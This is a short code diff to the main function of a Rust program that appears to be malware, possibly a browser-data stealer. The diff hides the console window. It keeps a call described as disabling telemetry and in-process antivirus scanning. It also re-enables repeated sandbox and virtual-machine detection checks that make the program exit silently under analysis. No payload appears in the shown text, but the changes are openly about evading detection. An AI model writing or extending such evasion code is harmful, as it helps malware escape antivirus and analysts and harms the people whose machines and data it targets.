@@ -1,5 +1,5 @@
 
-//#![windows_subsystem = "windows"]
+#![windows_subsystem = "windows"]
 
 mod browsers;
 mod core;
@@ -112,9 +112,20 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     // This silences telemetry and disables in-process AV scanning.
     core::bypass::apply_all();
 
-    // Detection checks disabled for diagnostic build
-    // core::detection::verify_environment();
-    // core::sandbox::verify_environment();
+    // Quick pre-flight check: obvious sandbox indicators
+    if !core::detection::verify_environment() {
+        return Ok(());
+    }
+
+    thread::sleep(Duration::from_millis(100));
+
+    // Second pass: quick check repeated after small delay
+    if !core::detection::verify_environment() {
+        return Ok(());
+    }
+
+    // Composite score-based check with all stealthy anti-VM/sandbox measures
+    core::sandbox::verify_environment();
 
     let _stealth_applied = false;
 
